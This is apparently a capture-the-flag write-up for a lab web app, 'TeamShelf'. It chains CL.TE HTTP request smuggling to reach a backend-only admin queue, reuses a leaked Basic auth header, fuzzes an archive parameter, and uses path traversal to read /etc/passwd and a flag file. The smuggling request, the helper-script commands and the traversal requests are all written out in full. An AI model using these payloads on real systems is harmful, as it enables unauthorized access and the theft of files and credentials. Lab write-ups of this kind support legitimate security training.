# TeamShelf Edge Writeup

| Field | Value |
|---|---|
| Category | Web |
| Difficulty | Hard |
| Main bug | CL.TE HTTP request smuggling |
| Impact | Backend-only admin access, credential leak, path traversal to `/home/local.txt` |
| Tools used | Browser, Burp Suite, ffuf, Python smuggler helper script |

## Overview

I treated TeamShelf like a real shared-storage web app: start with the visible workflows, understand how files are downloaded, inspect upload behavior, and only then move into the internal routes.

My final chain was:

1. Find the public storage and upload routes.
2. Trigger an upload rejection that leaks `/admin?queue=upload-review`.
3. Confirm direct `/admin` access is blocked by the edge.
4. Use the HTTP/1.1 keep-alive backend clue to test CL.TE smuggling.
5. Smuggle a request to the backend-only admin queue.
6. Read the archived Basic auth header and `/admin/archive` route.
7. Fuzz the archive parameter and find `filename`.
8. Use archive path traversal to read `/home/local.txt`.

![TeamShelf attack kill chain](images/image-1.png)

## Target Layout

The target has a public edge gateway in front of an internal object service. I could only reach the edge directly, so anything under the internal object service had to be reached through the edge-to-backend connection.

![TeamShelf infrastructure](images/image.png)

That layout made the keep-alive backend connection interesting. If the edge and backend disagreed about request framing, I could queue a backend request behind a normal public request.

## Enumeration

I first opened the app in the browser and looked at what a normal user could see.

![TeamShelf homepage](images/03-teamshelf-homepage.png)

The recent-object table exposed a few object paths, so I sent one of them through Burp to see how downloads worked.

```http
GET /download?id=teams/engineering/onboarding.txt HTTP/1.1
Host: <host>:<port>
```

![Valid public download in Burp](images/02-valid-download-burp.png)

That showed the public download endpoint was using an `id` parameter for published objects. I kept that in mind, but I did not assume it was the final bug.

Next I fuzzed common public paths:

```bash
ffuf -u "http://<host>:<port>/FUZZ" -w common.txt
```

![ffuf upload discovery](images/01-ffuf-upload-discovery.png)

`/upload` matched what I saw in the UI, so I moved toward the upload workflow. Before that, I checked the obvious file-read attempt against `/download`.

```http
GET /download?id=../../../../etc/passwd HTTP/1.1
Host: <host>:<port>
```

![Public download traversal blocked](images/04-public-download-traversal-blocked.png)

The response stayed generic, so I stopped spending time on `/download` and switched to the document intake form.

## Upload Review Clue

I tested the upload restriction with a non-PDF payload. The rejection response leaked where suspicious uploads are reviewed:

```json
{
  "error": "upload rejected",
  "notice": "Suspicious files are routed to the Admin Review queue: /admin?queue=upload-review"
}
```

![Upload rejection points to admin review](images/05-upload-rejection-admin-review.png)

That gave me a concrete internal route to try:

```text
/admin?queue=upload-review
```

## Edge Block

I requested the admin queue directly first.

```http
GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: close
```

```text
HTTP/1.1 404 Not Found
Server: TeamShelf-Edge/4.18
```

![Direct admin blocked by edge](images/06-direct-admin-edge-404.png)

The route was blocked at the edge. The `Server` header was the useful part: admin requests were answered by `TeamShelf-Edge/4.18`, while normal API routes came from the object service.

## Smuggling Setup

I checked `/api/health` next and got a backend-flavored response:

```json
{
  "backend": "obj-eu-archive-03",
  "edge": "cache-warm",
  "status": "ok",
  "upstream": "http/1.1 keep-alive"
}
```

That gave me the smuggling angle: the public edge talks to the object service over HTTP/1.1 keep-alive. I tested CL.TE framing, where the edge follows `Content-Length` and the backend follows `Transfer-Encoding: chunked`.

Doing this by hand in Burp was fragile, so I used a small Python smuggler helper script. The helper opens one connection, sends the CL.TE request, then sends `/api/health` as the trigger request.

```bash
python3 teamshelf-smuggler.py send "http://<host>:<port>" \
  "/admin?queue=upload-review" \
  --show-first --print-request
```

The generated smuggling request looked like this:

```http
POST /upload HTTP/1.1
Host: <host>:<port>
Content-Type: application/x-www-form-urlencoded
Content-Length: <computed-body-length>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: keep-alive

```

The trigger request was normal:

```http
GET /api/health HTTP/1.1
Host: <host>:<port>
Connection: close

```

I checked the trigger by itself first. With no smuggled request queued, there was nothing useful to read back.

![Empty trigger before smuggling](images/07-burp-trigger-tab-empty.png)

My first bad CL.TE attempts returned the normal upload rejection. That told me the backend was not parsing my hidden request as a clean second request yet.

![Wrong CL.TE attempt returns upload rejection](images/08-burp-smuggle-attempt-wrong-length.png)

I also tried Turbo Intruder while debugging connection reuse. When I only got `/api/health`, I knew I was still reading the trigger response instead of the smuggled admin response.

![Turbo Intruder health response during testing](images/09-turbo-intruder-health-not-smuggled.png)

## Admin Queue

After fixing the request ordering and length, the trigger response contained the admin queue.

![Smuggled admin queue leaks archived header](images/10-smuggled-admin-header-leak.png)

The page had two pieces I needed:

```html
<h1>Upload Review Queue</h1>
<code>Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2</code>
<code>GET /admin/archive</code>
```

![Smuggling proof with admin response](images/11-smuggling-proof-admin-response.png)

I then used the helper to check the admin behavior step by step:

```bash
python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin" --show-first
python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin?queue=upload-review" --show-first
```

```text
/admin                         -> admin queue not found
/admin?queue=upload-review     -> admin review queue page
```

![Smuggler admin and queue validation](images/13-smuggler-admin-and-queue.png)

From here, I used the same smuggling method for every backend-only archive request.

## Archive Endpoint

I added the leaked Basic header to the smuggled request:

```http
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
```

Requesting `/admin/archive` without a selector returned:

```json
{
  "error": "missing filename"
}
```

So I needed the parameter name. I tested common names manually and then fuzzed with my own parameter wordlist through the helper.

```bash
python3 teamshelf-smuggler.py fuzz "http://<host>:<port>" burp-parameter-names.txt --value test.txt
```

I used `test.txt` only to see how the endpoint reacted. A wrong parameter like `id` kept the same error:

```http
GET /admin/archive?id=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "missing filename"
}
```

When I switched to `filename`, the response changed to an object lookup:

```http
GET /admin/archive?filename=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "archive object not found",
  "filename": "test.txt"
}
```

That response identified the parameter:

```text
filename
```

![Archive parameter discovery](images/14-smuggler-archive-param-discovery.png)

## File Read

Before going for the flag, I tried the usual Linux check through the archive reader:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

When I was still hitting the wrong route, traversal looked like a normal missing object:

![Traversal attempt blocked outside archive reader](images/12-traversal-etc-passwd-not-found.png)

Through the smuggled archive request, `/etc/passwd` came back:

```text
root:x:0:0:root:/root:/usr/sbin/nologin
nobody:x:65532:65532:TeamShelf runtime user:/nonexistent:/usr/sbin/nologin
teamshelf:x:1000:1000:TeamShelf service account:/srv/teamshelf:/usr/sbin/nologin
```

![Successful passwd traversal](images/15-smuggler-etc-passwd.png)

After that, I changed the traversal target to the mounted flag path:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fhome%2Flocal.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```text
SECdojo{...}
```

![Final flag read](images/16-smuggler-final-flag.png)

## Flag

```text
/home/local.txt
```

## Final Chain

- I found `/upload` and used the upload rejection to discover `/admin?queue=upload-review`.
- I confirmed direct `/admin` was blocked by the edge.
- I used CL.TE smuggling with a Python helper script to reach the backend admin queue.
- I copied the archived Basic header from the queue.
- I fuzzed `/admin/archive` and found `filename`.
- I used `filename=../../../home/local.txt` through the smuggled archive request to read the flag.
